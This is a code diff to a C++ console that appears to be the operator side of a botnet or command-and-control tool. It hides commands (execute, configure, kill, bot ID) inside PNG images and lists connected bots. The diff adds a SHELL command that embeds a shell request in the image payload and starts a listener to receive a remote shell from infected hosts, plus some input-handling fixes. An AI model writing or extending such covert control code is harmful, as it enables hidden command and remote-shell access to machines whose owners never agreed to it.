@@ -35,6 +35,12 @@
                     return;
                 }
                 cliInstance->Kill = cliInstance->input[2];
+            }else if(cliInstance->input[1] == "SHELL"){
+                cliInstance->Shell.clear();
+                if(cliInstance->input.size() <3){
+                    return;
+                }
+                cliInstance->Shell = cliInstance->input[2];
             }else{
                 std::cout << "Error: Invalid Command" << std::endl;
 
@@ -48,7 +54,8 @@
             "KILL               NOT REQUIRED        "+ cliInstance->Kill + " \n"
             "CONF               NOT REQUIRED        "+ cliInstance->Conf + " \n"
             "EXEC               NOT REQUIRED        "+ cliInstance->Exec + " \n"
-            "ID                 REQUIRED            "+ cliInstance->id +   " \n";
+            "ID                 REQUIRED            "+ cliInstance->id +   " \n"
+            "SHELL              REQUIRED            "+ cliInstance->Shell +   " \n";
     }
     void cli::runCommand (cli *cliInstance){
          std::string commandParser = "<COM";
@@ -68,6 +75,10 @@
                 commandParser.append(":1-");
                 commandParser.append(cliInstance->Conf);
             }
+            if(!cliInstance->Shell.empty()){
+                commandParser.append(":3-");
+                commandParser.append(cliInstance->Shell);
+            }
             if(!cliInstance->Kill.empty()){
                 commandParser.append(":");
                 commandParser.append("0-0");
@@ -79,6 +90,13 @@
             encodeImage.readPNG(&dImage);  
             encodeImage.encodeImage(commandParser); 
             encodeImage.writePNG(&wImage);
+            //If there was a shell, setup handler
+            if(!cliInstance->Shell.empty()){
+                getShell(cliInstance);
+            }
+           
+          
+
     }
    void cli::showBots(cli *cliInstance){
         if(bots.empty()){
@@ -105,7 +123,7 @@
             (*iter->second)(cliInstance);
         }else{
             std::cout << "Error: Invalid Command" << std::endl;
-        }
+        }       
     }
     
     void cli::init(cli *cliInstance){
@@ -114,7 +132,7 @@
         cliInstance->map.emplace("show",&showInfo);
         cliInstance->map.emplace("run", &runCommand);
         cliInstance->map.emplace("bots",&showBots);
-  
+
     }
 
     int cli::parseCommand(std::string command){
@@ -136,19 +154,30 @@
         while(true){
             std::string command;
             //Pull for Input
-            std::getline(std::cin,command);
+            std::getline(std::cin,command,'\n');
+            //If cin fails, reset errors and cleanup
+            if(std::cin.fail()){
+                std::cin.clear();
+                std::cin.ignore(std::numeric_limits<std::streamsize>::max(),'\n');
+                continue;
+            }
             //Clear Input field each iteration
             cliInt->input.clear();
             //Parse Command for fields
             if(cliInt->parseCommand(command)){
                 std::cout << "Error: Invalid Syntex" << std::endl;
-                cliInt->input.clear();
                 continue;
             }
             cliInt->call_command(cliInt);
-            cliInt->input.empty();
         }
    
+    }
+
+    void cli::getShell(cli* cliInstance){
+        Server serverH(20,cliInstance->Shell);
+        if(serverH.serverHandler() != Server::Status::STATUS_OK){
+            return;
+        }
     }
 
 
